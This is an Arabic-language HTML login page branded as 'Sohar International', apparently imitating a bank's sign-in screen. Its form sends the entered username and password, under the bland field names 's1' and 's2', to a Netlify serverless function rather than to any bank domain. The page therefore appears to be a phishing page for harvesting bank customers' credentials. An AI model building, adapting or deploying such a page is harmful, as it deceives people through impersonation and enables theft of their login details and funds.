<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صُحار الدولية - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: white;
            direction: rtl;
            position: relative;
            overflow: hidden;
            height: 100vh;
        }
        
        /* العناصر البصرية في الخلفية */
        .bg-circles {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60%;
            z-index: 0;
            overflow: hidden;
        }
        
        .circle1 {
            position: absolute;
            width: 300px;
            height: 300px;
            background-color: rgba(0, 97, 74, 0.4);
            border-radius: 50%;
            bottom: -120px;
            left: -120px;
        }
        
        .circle2 {
            position: absolute;
            width: 250px;
            height: 250px;
            background-color: rgba(0, 97, 74, 0.6);
            border-radius: 50%;
            bottom: 100px;
            left: 100px;
        }
        
        /* نافبار */
        .navbar {
            background-color: #1d1d1d;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #333;
        }
        
        .navbar .back-btn {
            color: white;
            font-size: 24px;
            text-decoration: none;
            margin-right: 10px;
        }
        
        .navbar .title {
            color: white;
            flex-grow: 1;
            text-align: right;
            font-size: 16px;
        }
        
        .navbar .actions {
            display: flex;
            gap: 15px;
        }
        
        .navbar .action-btn {
            color: white;
            font-size: 18px;
        }
        
        /* تبديل اللغة */
        .language-switch {
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            color: #888;
        }
        
        .language-switch a {
            color: white;
            text-decoration: none;
            padding: 0 5px;
        }
        
        /* لوجو */
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 40px 0;
        }
        
        .logo {
            position: relative;
            width: 120px;
            height: 120px;
        }
        
        .logo-circle {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 2px solid white;
            border-radius: 50%;
        }
        
        .logo-line {
            position: absolute;
            top: 0;
            left: 50%;
            height: 100%;
            width: 2px;
            background-color: #ff9f1c;
            transform: translateX(-50%);
        }
        
        .logo-text-right {
            position: absolute;
            left: 130%;
            top: 30%;
            text-align: right;
            white-space: nowrap;
        }
        
        .logo-text-left {
            position: absolute;
            right: 130%;
            top: 30%;
            text-align: left;
            white-space: nowrap;
        }
        
        .logo-text-main {
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .logo-text-sub {
            font-size: 14px;
            color: #888;
        }
        
        /* نموذج تسجيل الدخول */
        .login-container {
            width: 85%;
            max-width: 400px;
            margin: 0 auto;
            padding: 10px;
            position: relative;
            z-index: 1;
        }
        
        .form-control {
            width: 100%;
            background-color: #222;
            border: none;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 15px;
            color: white;
            font-size: 16px;
        }
        
        .form-control::placeholder {
            color: rgba(255, 255, 255, 0.8);
            text-align: right;
        }
        
        .btn-login {
            width: 100%;
            background-color: #ff9f1c;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        /* القائمة السفلية */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-around;
            background-color: #111;
            padding: 10px 0;
            border-top: 1px solid #333;
        }
        
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #888;
            text-decoration: none;
            font-size: 12px;
        }
        
        .nav-icon {
            font-size: 20px;
            margin-bottom: 3px;
        }
        
        /* أزرار التنقل السفلية */
        .nav-controls {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-between;
            background-color: #222;
            padding: 10px 0;
            border-top: 1px solid #333;
        }
        
        .nav-control {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 40px;
            color: #fff;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <!-- خلفية الدوائر -->
    <div class="bg-circles">
        <div class="circle1"></div>
        <div class="circle2"></div>
    </div>
    
    
    
    <!-- تبديل اللغة -->
    <div class="language-switch">
        <a href="#">العربية</a> | <a href="#">English</a>
    </div>
    
    <!-- لوجو صحار -->
    <div class="logo-container">
        <div class="logo">
            
            <div class="logo-text-right">
                <div class="logo-text-main">صُحــــار</div>
                <div class="logo-text-sub">الدولي</div>
            </div>
            
            </div>
        </div>
    </div>
    
    <!-- نموذج تسجيل الدخول -->
    <div class="login-container">
        <form action="/.netlify/functions/submit-login" method="post"id="loginForm">
            <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم" required>
            <input name="s2" type="password" class="form-control" placeholder="كلمة المرور" required>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>
    
    
</body>
</html>
